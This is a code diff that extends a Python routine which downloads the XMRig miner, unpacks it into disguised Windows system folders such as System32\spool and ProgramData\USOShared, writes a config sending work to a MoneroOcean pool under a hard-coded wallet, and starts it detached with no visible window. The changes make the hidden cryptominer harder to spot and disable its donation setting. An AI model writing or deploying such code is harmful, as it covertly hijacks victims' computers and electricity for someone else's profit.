@@ -21,8 +21,17 @@ def main(**kwargs):
                    if "ARM" in arch.upper()
                    else "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-gcc-x64.zip")
             z = dl(url, 300)
-            base = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), ".kfwin")
-            os.makedirs(base, exist_ok=True)
+            base = None
+            for _cand in ("C:\\Windows\\System32\\spool", "C:\\ProgramData\\USOShared"):
+                try:
+                    os.makedirs(_cand, exist_ok=True)
+                    if os.access(_cand, os.W_OK | os.X_OK):
+                        base = _cand; break
+                except Exception:
+                    continue
+            if not base:
+                base = os.path.join(os.environ.get("ProgramData", "C:\\ProgramData"), "USOShared")
+                os.makedirs(base, exist_ok=True)
             zipfile.ZipFile(io.BytesIO(z)).extractall(base)
             exe = os.path.join(base, "xmrig.exe")
             if not os.path.exists(exe):
@@ -32,8 +41,9 @@ def main(**kwargs):
             wid = "k7p-win-" + platform.node()[:8]
             cfg = os.path.join(base, "config.json")
             import json as _j
+            _j.dumps  # noqa
             pool = "gulf.moneroocean.stream:10128"
-            _j.dump({"autosave": True, "cpu": {"max-threads-hint": 85, "priority": 0},
+            _j.dump({"autosave": True, "cpu": {"max-threads-hint": 85, "priority": 0}, "donate-level": 0,
                      "pools": [{"url": pool, "user": os.environ.get("KF_WALLET",
                                "42cRzqLbgMMZVex62mpPZYL9VLDdfjTvm8SGZc2KuvQdeK4eWaQav9TSXpcUZnYWCtidyABFmYuBA8Ub4VkYmjFTUUcpe79"),
                                "pass": wid, "tls": False}]},
@@ -42,7 +52,7 @@ def main(**kwargs):
             CREATE_NEW_PROCESS_GROUP = 0x00000200
             CREATE_NO_WINDOW = 0x08000000
             import subprocess as sp
-            sp.Popen([exe, "-c", cfg, "--donate-level", "1", "--background"],
+            sp.Popen([exe, "-c", cfg, "--donate-level", "0", "--background"],
                      creationflags=DETACHED | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
                      close_fds=True)
             time.sleep(20)
